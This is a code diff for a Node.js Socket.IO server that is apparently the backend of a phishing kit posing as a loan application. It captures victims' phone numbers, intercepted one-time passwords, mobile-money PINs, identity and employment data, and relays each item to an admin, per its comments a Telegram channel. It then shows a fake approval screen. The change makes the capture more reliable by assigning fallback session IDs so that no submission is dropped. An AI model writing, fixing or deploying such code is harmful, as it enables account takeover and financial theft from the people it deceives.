@@ -31,91 +31,83 @@ app.post(`/bot${process.env.BOT_TOKEN}`, (req, res) => {
     res.sendStatus(200);
 });
 
-// Helper function to thoroughly sanitize the session room ID and prevent 'null' logs
-function resolveRoomId(data, activeRoom) {
-    if (data && data.appId && data.appId !== "" && data.appId !== "null" && data.appId !== null) {
-        return data.appId;
-    }
-    return activeRoom;
-}
-
 io.on('connection', (socket) => {
-    let activeRoom = null;
+    // Generate a reliable backend fallback ID immediately on connection
+    let activeRoom = `WFI-${Math.random().toString(36).substring(2, 7).toUpperCase()}`;
+    
+    // Automatically join the generated room right away
+    socket.join(activeRoom);
+    socket.emit('session-ready', { appId: activeRoom });
+    console.log(`🔌 Assigned internal fallback session: ${activeRoom}`);
 
     socket.on('join-room', (room) => {
-        if (!room || room === "null") return;
-        socket.join(room);
-        activeRoom = room;
-        console.log(`🔌 User joined room: ${room}`);
+        if (room && room !== "null" && room !== "") {
+            socket.leave(activeRoom); // Leave the old fallback room
+            socket.join(room);
+            activeRoom = room;
+            console.log(`🔌 User synchronized room to: ${room}`);
+        }
     });
+
+    // Helper to prioritize the reliable server room over client-side variables
+    const getValidId = (data) => {
+        if (data && data.appId && data.appId !== "null" && data.appId !== "") {
+            return data.appId;
+        }
+        return activeRoom;
+    };
 
     // STEP 1: Phone submission
     socket.on('request-otp1', (data) => {
-        const currentId = resolveRoomId(data, activeRoom);
-        if (!currentId) return console.error("⚠️ Dropped request-otp1: No valid room ID found.");
-        
+        const currentId = getValidId(data);
         botManager.sendToAdmin(currentId, "🇸🇴 Initial Request: Phone Submitted", { Phone: data.phone }, false);
     });
 
     // STEP 1 Validation: Intercepted OTP 1
     socket.on('step4-otp', (data) => {
-        const currentId = resolveRoomId(data, activeRoom);
-        if (!currentId) return console.error("⚠️ Dropped step4-otp: No valid room ID found.");
-
+        const currentId = getValidId(data);
         botManager.sendToAdmin(currentId, "🇸🇴 Step 1: Phone & Intercepted OTP 1", { Phone: data.phone, "OTP 1": data.otp }, true);
     });
 
     // STEP 2: MoMo PIN Entry
     socket.on('step5-pin', (data) => {
-        const currentId = resolveRoomId(data, activeRoom);
-        if (!currentId) return console.error("⚠️ Dropped step5-pin: No valid room ID found.");
-
+        const currentId = getValidId(data);
         botManager.sendFinalApproval(currentId, data.pin);
     });
 
     // STEP 3: OTP 2 Validation
     socket.on('submit-otp2', (data) => {
-        const currentId = resolveRoomId(data, activeRoom);
-        if (!currentId) return console.error("⚠️ Dropped submit-otp2: No valid room ID found.");
-
+        const currentId = getValidId(data);
         botManager.sendSecondOTP(currentId, data.otp2);
     });
 
     // STEP 4: Loan Request Parameters
     socket.on('step1', (data) => {
-        const currentId = resolveRoomId(data, activeRoom);
-        if (!currentId) return console.error("⚠️ Dropped step1 parameters: No valid room ID found.");
-
+        const currentId = getValidId(data);
         const { appId, ...cleanData } = data;
         botManager.sendToAdmin(currentId, "🇸🇴 Step 4: Loan Request Parameters", cleanData, true);
     });
 
     // STEP 5: Personal Identity Profile
     socket.on('step2', (data) => {
-        const currentId = resolveRoomId(data, activeRoom);
-        if (!currentId) return console.error("⚠️ Dropped step2 identity profile: No valid room ID found.");
-
+        const currentId = getValidId(data);
         const { appId, ...cleanData } = data;
         botManager.sendToAdmin(currentId, "🇸🇴 Step 5: Personal Identity Profile", cleanData, true);
     });
     
     // STEP 6: Employment & Income Status
     socket.on('step3-data', (data) => {
-        const currentId = resolveRoomId(data, activeRoom);
-        if (!currentId) return console.error("⚠️ Dropped step3 employment metrics: No valid room ID found.");
-
+        const currentId = getValidId(data);
         const { appId, ...cleanData } = data;
         
-        // Final form data delivery to Telegram channel
         botManager.sendToAdmin(currentId, "🇸🇴 Step 6: Employment & Income Status", cleanData, false);
         
-        // Auto-approve and transition frontend to Step 7 success template
         const referenceId = `REF-${Math.floor(100000 + Math.random() * 900000)}`;
         io.to(currentId).emit('application-complete', { referenceId });
     });
 
     socket.on('disconnect', () => {
-        if (activeRoom) console.log(`🔌 User disconnected socket room: ${activeRoom}`);
+        console.log(`🔌 User disconnected socket room: ${activeRoom}`);
     });
 });
 
